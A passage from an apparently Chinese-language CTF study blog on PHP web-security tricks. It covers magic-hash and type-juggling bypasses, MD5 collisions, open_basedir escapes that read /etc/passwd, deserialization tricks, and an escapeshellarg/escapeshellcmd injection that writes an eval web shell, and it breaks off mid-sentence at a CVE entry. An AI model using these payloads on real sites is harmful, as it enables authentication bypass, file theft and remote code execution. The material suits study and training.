class="line">Copy</span><br></pre></td></tr></table></figure></li><li><p>md5(string,raw)<br>String: 必需，为要计算的字符串<br>Raw: true:-原始16字符二进制格式<br>false:-默认。32字符十六进制数</p></li><li><p>若MD5值经hex转换为字符串后为’or’+balabala这样的字符串；那么拼接的查询语句为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;balabala&#39;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></li><li><p>当’or’后的值为true时，即可构成万能密码；在此利用到一个mysql特性：<br><code>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数</code>（测试时发现只要是数字都可以）<br>(ps：这种情况必须有单引号括起来<br>如<code>password=&#39;xxx&#39; or &#39;1xxxxxxxxx&#39;</code>就相当于<code>password=&#39;xxx&#39; or 1</code>；故返回值为true)</p></li><li><p>常用payload：<code>ffifdyop</code></p></li></ul></blockquote><blockquote><p>弱类型比较bypass</p><p>利用一些MD5编码后为0e开头的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&gt;一些md5编码后得到0exxx（此处xxx为十进制字符）的字符串</span><br><span class="line">&gt;原字符串md5值</span><br><span class="line">&gt;QNKCDZO0e830400451993494058024219903391</span><br><span class="line">&gt;2406107080e462097431906509019562988736854</span><br><span class="line">&gt;aabg7XSs0e087386482136013740957780965295</span><br><span class="line">&gt;aabC9RqS0e041022518165728065344349536299</span><br><span class="line">&gt;s878926199a0e545993274517709034328855841020</span><br><span class="line">&gt;s155964671a0e342768416822451524974117254469</span><br><span class="line">&gt;s214587387a0e848240448830537924465865611904</span><br><span class="line">&gt;s214587387a0e848240448830537924465865611904</span><br><span class="line">&gt;s878926199a0e545993274517709034328855841020</span><br><span class="line">&gt;s1091221200a0e940624217856561557816327384675</span><br><span class="line">&gt;s1885207154a0e509367213418206700842008763514</span><br><span class="line">&gt;qebi7zl00e649420541288950724577306786996</span><br><span class="line">&gt;qebaur5g0e352312259284787676841028696030</span><br><span class="line">&gt;qe20k7jl0e416004725936696827118806457976</span><br><span class="line">&gt;qe9vwdjf0e288029216666843876260611249898</span><br><span class="line">Copy</span><br><span class="line">&gt;# 补一些做题的脚本吧</span><br><span class="line">&gt;# 生成md5值为0exxx的--，还有一些套娃关卡的第一关也是要求验证码，改一下就能用了</span><br><span class="line">&gt;import hashlib</span><br><span class="line">&gt;l &#x3D; &#39;qwertyuiopasdfghjklzxcvbnm1234567890&#39;</span><br><span class="line">&gt;for i in l:</span><br><span class="line">   for j in l:</span><br><span class="line">      for k in l:</span><br><span class="line">          for m in l:</span><br><span class="line">              for n in l:</span><br><span class="line">                  for o in l:</span><br><span class="line">                      for p in l:</span><br><span class="line">                          for q in l:</span><br><span class="line">                              f &#x3D; i + j + k + m + n + o + p + q</span><br><span class="line">                              md5 &#x3D; hashlib.md5(f.encode(encoding&#x3D;&#39;UTF-8&#39;)).hexdigest()</span><br><span class="line">                              if md5[:2] &#x3D;&#x3D; &#39;0e&#39; and str.isdigit(md5[2:]):</span><br><span class="line">                                  print(f)</span><br><span class="line">                                  print(md5)</span><br><span class="line">&gt;# 碰到的某道题 要求变量$a&#x3D;&#x3D;md5($a)</span><br><span class="line">&gt;import hashlib</span><br><span class="line"></span><br><span class="line">&gt;for i in range(0,10**41):</span><br><span class="line">&gt;i&#x3D;&#39;0e&#39;+str(i)</span><br><span class="line">&gt;md5&#x3D;hashlib.md5(i.encode()).hexdigest()</span><br><span class="line">&gt;if md5[:2]&#x3D;&#x3D;&#39;0e&#39; and md5[2:].isdigit():</span><br><span class="line">&gt;print(&#39;md5:&#123;&#125; &#39;.format(i))</span><br><span class="line">break</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>强比较bypass</p><p>常见的：数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;eg：</span><br><span class="line">&gt;(md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg)</span><br><span class="line">&gt;直接数组绕过：</span><br><span class="line">&gt;?id[]&#x3D;1&amp;gg[]&#x3D;2</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>还有最近碰到的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;(string)$_POST[&#39;a1&#39;]!&#x3D;&#x3D;(string)$_POST[&#39;a2&#39;]&amp;&amp;md5($_POST[&#39;a1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;a2&#39;])&#125;</span><br><span class="line">&gt;# 最后转换为字符串比较，使用数组就不可行了</span><br><span class="line">&gt;# 只能使用两组MD5值相同的不同字符串了，这里可以用脚本跑，这里就直接上一组url编码过后的值：</span><br><span class="line">&gt;# 1</span><br><span class="line">&gt;a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&gt;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&gt;# 2</span><br><span class="line">&gt;a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&gt;&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></blockquote><h3 id="substr-、sha1-、base64-decode"><a href="#substr-、sha1-、base64-decode" class="headerlink" title="substr()、sha1()、base64_decode"></a>substr()、sha1()、base64_decode</h3><blockquote><p>md5()、sha1()、base64_decode()只能处理传入的字符串数据<br>当传入数组后会报出Warning错误，但仍会正常运行并返回值，当==左右两边都错误时，并且正常运行返回相同的值，就可以是判定条件成立</p><p>bypass：对substr()、sha1()、base64_decode()传入数组则返回null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;$a&#x3D;[];</span><br><span class="line">&gt;var_dump(substr($a, 123));&#x2F;&#x2F;NULL</span><br><span class="line">&gt;var_dump(sha1($a));&#x2F;&#x2F;NULL</span><br><span class="line">&gt;# sha1后为0e数字的值：</span><br><span class="line">&gt;# aaK1STfY0e76658526655756207688271159624026011393</span><br><span class="line">&gt;# aaO8zKZF0e89257456677279068558073954252716165668</span><br><span class="line">&gt;var_dump(substr($a, 123) &#x3D;&#x3D;&#x3D; sha1($cc));&#x2F;&#x2F;bool(true)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></blockquote><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><blockquote><p>strcmp(str1,str2)：比较两个字符串str1和str2</p><p>str1&lt;str2 返回&lt;0<br>str1&gt;str2返回&gt;0<br>str1=str2 返回0</p><p>（ps：数据类型不匹配(即传入非字符串类型)，也会返回0 （仅php&lt;5.3））</p><p>bypass：同样的，给strcmp的参数为数组也会返回null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 传入 passwd[]&#x3D;xxx</span><br><span class="line">实际是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等（某种意义上null相当于false）</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure></blockquote><h3 id="swtich"><a href="#swtich" class="headerlink" title="swtich()"></a>swtich()</h3><blockquote><p>若switch的case判断类型为数值，则switch会将参数转换为int类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$i &#x3D;&quot;2hhh&quot;;</span><br><span class="line">switch ($i) &#123;</span><br><span class="line">case 0:break;</span><br><span class="line">case 1:break;</span><br><span class="line">case 2:</span><br><span class="line">    echo &quot;success,i&#x3D;2&quot;;</span><br><span class="line">    break;</span><br><span class="line">case 3:</span><br><span class="line">    echo &quot;i is 3&quot;;break;</span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2021/03/10/KnycN41kMCS7IVx.png"><img src="https://i.loli.net/2021/03/10/KnycN41kMCS7IVx.png" alt="img"></a></p></blockquote><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><blockquote><p>is_numeric() ：判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。</p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断因此输入%20password在解析变量名就会变成password</p><p>bypass：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">passwd&#x3D;1234567%20</span><br><span class="line"></span><br><span class="line">passwd&#x3D;1234567%00</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>此外：在某些cms中，会利用如下代码检测用户输入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 该片段判断参数s是否为数字，是则带入数据库查询，不是则返回0</span><br><span class="line">$s &#x3D; is_numeric($_GET[&#39;s&#39;])?$_GET[&#39;s&#39;]:0;</span><br><span class="line">$sql&#x3D;&quot;insert into test(type)values($s);&quot;;  &#x2F;&#x2F;是 values($s) 不是values(&#39;$s&#39;)</span><br><span class="line">mysql_query($sql);</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>但可以将sql语句转换为16进制传给参数</p><p><a href="https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg"><img src="https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg" alt="img"></a></p><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><p><code>intval ( mixed $value , int $base = 10 ) : int</code>——获取变量的整数值<br>value：要转换的数量值，base：转换所用进制</p><p>三个特性：</p><ul><li><p>成功：返回var的整数值；<br>失败 | 空数组：返回0；</p><pre><code>非空数组：返回1</code></pre></li><li><blockquote><p>如果 <code>base</code> 是 0，通过检测 <code>value</code> 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul></blockquote></li><li><p>base为0，变量在遇上数字或正负符号才做转换，遇到非数字或字符串结束时以(\0)结束转换，ps：前提是进行弱类型比较</p></li></ul><blockquote><p>eg1:</p><p><img src="https://i.loli.net/2021/03/16/rmzM8cI3FtHa4lA.png"><br>由此可输入三种payload：</p><ul><li>十六进制：?num=0x117c </li><li>小数点：?num=4476.110</li><li>?num=4476e1</li></ul><p>eg2:</p><p><img src="https://i.loli.net/2021/03/16/lHMVZnLrtFq9REp.png" alt="朴实无华"><br>Intval在处理字符串型的科学计数法时只输出e前的数字，而+1后又作为数字处理</p><p>echo intval(1e10);     =》10000000000</p><p>echo intval(“1e10”);     =》1</p><p>echo intval(“1e10”+1); =》10000000001</p></blockquote><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><blockquote><p><code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p><p>（ps：strict相当于是否开启强比较）<br>不提供$strict参数(即默认为false)时，会进行松散比较，判断$needle是否在数组$haystack中<br>$strict=true；还会比较$needle和$haystack中元素类型是否相同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$array</span>=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3&#x27;</span>];</span><br><span class="line">&gt;var_dump(in_array(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>));  <span class="comment">//true# &#x27;abc&#x27;转换为0</span></span><br><span class="line">&gt;var_dump(in_array(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>));  <span class="comment">//true# &#x27;1bc&#x27;转换为1</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="comment"># 转换整型int/浮点型float会返回元素个数；</span></span><br><span class="line">&gt;<span class="comment"># 转换bool返回Array中是否有元素；</span></span><br><span class="line">&gt;<span class="comment"># 转换成string返回&#x27;Array&#x27;，并抛出warning</span></span><br></pre></td></tr></table></figure><p>array_search()和in_array()类似</p></blockquote><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><ol><li>preg_match只能处理字符串，当传入数组时会返回false</li><li><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li><li><code>.</code>不会匹配换行符；<br>eg:<code>preg_match(&#39;/^.*(flag).*$/&#39;, $a)</code>可令<code>a=&quot;\nflag&quot;</code><br>而非多行模式下，<code>$</code>会忽略末尾的<code>%0a</code>即空字符；<br>eg:<code>preg_match(&#39;/^flag$/&#39;, $_GET[&#39;a&#39;]) &amp;&amp; $_GET[&#39;a&#39;] !== &#39;flag&#39;</code>可输入<code>a=flag%0a</code></li></ol><h3 id="open-basedir-绕过"><a href="#open-basedir-绕过" class="headerlink" title="open_basedir()绕过"></a>open_basedir()绕过</h3><h4 id="chdir-、ini-set-函数组合"><a href="#chdir-、ini-set-函数组合" class="headerlink" title="chdir()、ini_set()函数组合"></a>chdir()、ini_set()函数组合</h4><p>利用ini_set()设置php.ini的值，在函数执行时生效，脚本结束后恢复原状。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set ( <span class="keyword">string</span> <span class="variable">$varname</span> , <span class="keyword">string</span> <span class="variable">$newvalue</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>varname是需要设置的值；newvalue是设置成为新的值<br>成功时返回旧的值，失败时返回 FALSE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);system(‘cat ../../../../../etc/passwd’);</span><br></pre></td></tr></table></figure><h4 id="glob"><a href="#glob" class="headerlink" title="glob://"></a>glob://</h4><p>glob://协议是php5.3.0以后一种查找匹配的文件路径模式，而单纯传参glob://是没办法列目录的，需要结合其他函数方法</p><h5 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob://"></a>scandir()+glob://</h5><p>只能列出根目录以及open_basedir()允许目录下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;glob:///*&#x27;</span>));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h5 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob://"></a>DirectoryIterator+glob://</h5><p>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payloadL:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*.txt&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#glob:///*会列出根目录下的文件</span></span><br><span class="line"><span class="comment"># glob://*会列出open_basedir允许目录下的文件</span></span><br></pre></td></tr></table></figure><h5 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob://"></a>opendir()+readdir()+glob://</h5><p>同样只能列出根目录已经open_basedir()允许的目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = opendir(<span class="string">&#x27;glob:///*&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = readdir(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="序列化数据的标识"><a href="#序列化数据的标识" class="headerlink" title="序列化数据的标识"></a>序列化数据的标识</h3><blockquote><p>a - array 数组<br>b - boolean 布尔型<br>d - double 浮点型<br>i - integer 整数型<br>o - common object 共同对象<br>r - reference 对象引用<br>s - string 纯字符串<br>S - string 此时字符串支持后面的字符用16进制表示<br>C - custom object 自定义对象<br>O - class 类<br>N - null 空<br>R - pointer reference 指针引用<br>U - unicode string Unicode编码的字符串（php4、5不支持）</p><p>在php中，引用意为不同的名字访问同一个变量内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如下：</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;funny&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">15</span>:<span class="string">&quot;funnypassword&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;verify&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>关于反序列化时s的使用：s为纯字符串，S则可以使用十六进制表示字符串如</p><p>[16进制两位字符]</p><p>比如\61表示A</p></blockquote><h3 id="对象字段名的序列化"><a href="#对象字段名的序列化" class="headerlink" title="对象字段名的序列化"></a>对象字段名的序列化</h3><p>（ps：php7.1以上对属性类型不敏感，构造payload时直接传入类为public也可）</p><p>private属性序列化的时候格式是 <code>%00类名%00成员名</code> | <code>\0类名\0成员名</code></p><p>protected属性序列化的时候格式是 <code>%00*%00成员名</code> | <code>\0*\0成员名</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">如：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test1</span>=<span class="string">&quot;hello&quot;</span>;<span class="comment">#\00test\00test1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hello&quot;</span>;<span class="comment">#test2</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span>=<span class="string">&quot;hello&quot;</span>;<span class="comment">#\00*\00test3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br><span class="line">输出得：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:</span><br><span class="line">&#123;s:<span class="number">11</span>:<span class="string">&quot; test test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot; * test3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">但真实结果为：（ps：这是因为\<span class="number">00</span>为空字符，不显示在控制台中，观察s后的字符数即可发现）</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;\00test\00test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;\00*\00test3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">那么在url传参时就要将\<span class="number">00</span>编码为%<span class="number">00</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/10/9a4Ojwx8WV53qky.png"></p><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过_wakeup()"></a>绕过_wakeup()</h3><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,并且不会报错,可以被正常反序列化</p><p>如下对象属性个数为3，若将其更改为大于3即可绕过_wakeup()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot; test test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot; * test3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="php伪协议的运用"><a href="#php伪协议的运用" class="headerlink" title="php伪协议的运用"></a>php伪协议的运用</h2><p><a href="http://na0hblog.top/">http://na0hblog.top/</a></p><h2 id="escapeshellarg-escapeshellcmd造成的漏洞"><a href="#escapeshellarg-escapeshellcmd造成的漏洞" class="headerlink" title="escapeshellarg+escapeshellcmd造成的漏洞"></a>escapeshellarg+escapeshellcmd造成的漏洞</h2><ul><li><p>Escapeshellarg：把字符串转码为可以在 shell 命令里使用的参数<br>Escapeshellcmd：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义</p></li><li><p>(该漏洞实际就是两次转义后的闭合出现了问题，没考虑到单引号<br>不过现在无论哪个版本好像都被修复了。。)</p></li></ul><blockquote><p>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code><br><strong>escapeshellarg</strong>处理后：<br><code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对<code>单引号&#39;</code>转义，再用单引号将左右两部分括起来从而起到连接的作用<br><strong>escapeshellcmd</strong>处理后：<br><code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这里escapeshellcmd对<code>\</code>以及<code>最后那个不配对儿的引号</code>进行了转义</p><p>最终 <code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>就相当于<code>172.17.0.2\ -v -d a=1&#39;</code><br>中间的<code>\\</code>被解释为<code>\</code>而不是转义字符，故<code>\后面的&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。<br>则curl 172.17.0.2\ -v -d a=1’，即为向172.17.0.2\发起请求，POST 数据为a=1’</p></blockquote><p>在给出做题时的例子：</p><blockquote><p>[BUUCTF 2018]Online Tool：</p><p>(ps：nmap -oG 可将命令写入文件；命令含闭合引号无影响)</p><p>首先要明确会被\转义的符号：<code>\、?、&lt;、&gt;、(、)、[、]、;、不配对的&#39;、&#39;&#39;</code><br>1、<code>传入&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php</code><br>=&gt; <code>&#39;&#39;\&#39;&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php&#39;</code><br>=&gt; <code> &#39;&#39;\&#39;&#39; \&lt;\?php eval\($_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG hhh.php \&#39;</code><br>此时文件名为<code>hhh.php&#39;</code></p><p>2、传入<code>&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;</code><br>=&gt;<code>  &#39;&#39;\&#39;&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;\&#39;&#39;&#39;</code><br>=&gt; <code>&#39;&#39;\\&#39;&#39; \&lt;\?php eval\($_POST\[&quot;a&quot;\]\)\;\?\&gt; -oG hhh.php &#39;\\&#39;&#39;&#39;    </code><br>（这里的’和文件名中间必须有空格，否则就会生成hhh.php\这样的文件）</p><p>故最终payload：<code>&#39; &lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG hhh.php &#39;</code></p></blockquote><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h2 id="cve-2020-7066"><a href="#cve-2020-7066" class="headerlink" title="cve-2020-7066"></a>cve-2020-7066</h2><ul><li><p>描述：在PHP版本7.2.x低于7.2.29；7.3.x低于7.3.16；7.4.x低于7.4.4，而使用get_headers（）与用户提供的网址，如果URL包含零（\0）字符，URL将被默默地截断在它。这可能会导致某些软件对get_headers的目标做出错误的假设，并可能向错误的服务器发送一些信息</p></li><li><p>get_headers() 返回一个数组，包含有服务器响应一个 